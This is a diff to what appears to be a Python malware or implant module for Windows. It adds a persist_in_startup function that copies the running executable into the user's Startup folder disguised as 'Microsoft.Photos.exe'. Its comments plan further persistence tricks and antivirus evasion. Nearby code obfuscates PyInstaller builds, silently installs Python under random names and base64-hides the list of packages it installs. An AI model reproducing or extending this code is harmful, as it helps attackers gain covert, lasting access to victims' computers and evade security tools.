@@ -3,7 +3,7 @@ import subprocess
 import os
 import random
 import base64
-from Utils.helpers import is_os_64bit,run_pwsh,is_msvc_exist,download_file,extract_zip
+from Utils.helpers import is_os_64bit,run_pwsh,is_msvc_exist,download_file,extract_zip,get_current_file_path,base64_encode_file
 from .pyinstaller_obfuscate.obfuscationModule.main import Obfuscate
 from .pyinstaller_obfuscate.main import obfuscate_files
 
@@ -23,11 +23,21 @@ def download_pyinstaller(download_path : str):
     if os.path.exists(clean_path):
         shutil.rmtree(clean_path)
     if download_file(clean_path,URL):
-        final_dir = clean_path.split('/')[::-1] #//TODO: check if this actually works!
+        final_dir = clean_path.split('/')[::-1] #//TODO 1: check if this actually works!
         if extract_zip(f"c:/users/{os.getlogin()}/appdata/local/temp",clean_path):
             return f"c:/users/{os.getlogin()}/appdata/local/temp/{final_dir}"
     return False
 
+
+def persist_in_startup():
+    """no matter what we succeed to do just copy the current running exe to the startup folder
+    //TODO 3: find another creative ways to persist in the FS and evade AV"""
+    base64_of_ourself = base64_encode_file(get_current_file_path()) #str
+    name_for_copy = "Microsoft.Photos.exe" #//TODO 2: add here names of unsigned files in windows with random.choice.
+    startup_folder = f"c:/users/{os.getlogin()}/appdata/roaming/microsoft/windows/start menu/programs/startup/{name_for_copy}"
+    with open(startup_folder,'wb') as new_file:
+        new_file.write(base64.b64decode(base64_of_ourself.encode())) #//TODO 4: Check if this working.
+    return True
 
 
 
@@ -35,7 +45,7 @@ def get_pyinstaller(pythonPath:str,admin=True):
     """
     :param str pythonPath: abs path to python.exe
     :param bool admin: specify if we got admin permissions.
-    //TODO: create 3 functions from this one. one for each condition.
+    //TODO 5: create 3 functions from this one. one for each condition.
     """
     PATH = f"c:/users/{os.getlogin()}/appdata/local/temp/pyinstaller-4.7.zip"
     if not download_pyinstaller(PATH):
@@ -63,7 +73,7 @@ def get_pyinstaller(pythonPath:str,admin=True):
     #no admin
     if is_msvc_exist():
         #assume your are not admin, but pyinstaller exist and you have msvc
-        #TODO:// detect other C COMPILERS
+        #TODO 6:// detect other C COMPILERS
         return
 
     pass
@@ -72,7 +82,7 @@ def pip_install(new_path=None):
     """
     :param new_path: new path for pytohn.exe (called new_path as we assume we installed python!)
     to_install is base64 encoded list of python packages to install with git
-     //TODO: change new_path name and arch to something more obious
+     //TODO 7: change new_path name and arch to something more obious
     """
     to_install = "Y3J5cHRvZ3JhcGh5IHRpbnlhZXMgbmV0aWZhY2VzIHJlcXVlc3RzIHBzdXRpbCBwYXRobGliMiB3aGVlbA=="
     if new_path:
@@ -92,15 +102,12 @@ def install_python():
     """
     this function gets called if we didn't find any python installed.
     we can install python with user and admin rights, here it's user only install!
-    //TODO: check if user is admin (pass it as param), and if admin then install the python as admin
-    //TODO: store urls in variables, strings are bad AF
-    //TODO: we always return True. WTF? we should check if installation succeed and return bool by that.
+    //TODO 8: check if user is admin (pass it as param), and if admin then install the python as admin
+    //TODO 9: store urls in variables, strings are bad AF
+    //TODO 10: we always return True. WTF? we should check if installation succeed and return bool by that.
     """
-    os_p = 64
-    if not is_os_64bit():
-        os_p = 32
+    url = "https://www.python.org/ftp/python/3.8.1/python-3.8.1-amd64.exe" if is_os_64bit() else "https://www.python.org/ftp/python/3.8.1/python-3.8.1.exe"
     rand_py = f'python{random.randrange(111, 9999999)}.exe'
-    url = "https://www.python.org/ftp/python/3.8.1/python-3.8.1-amd64.exe" if os_p == 64 else "https://www.python.org/ftp/python/3.8.1/python-3.8.1.exe"
     d = run_pwsh(f"""iwr -Uri {url} -OutFile c:/users/$env:username/appdata/local/temp/{rand_py} """)
     if os.path.exists(f"c:/users/{os.getlogin()}/appdata/local/temp/{rand_py}"):
         subprocess.run(
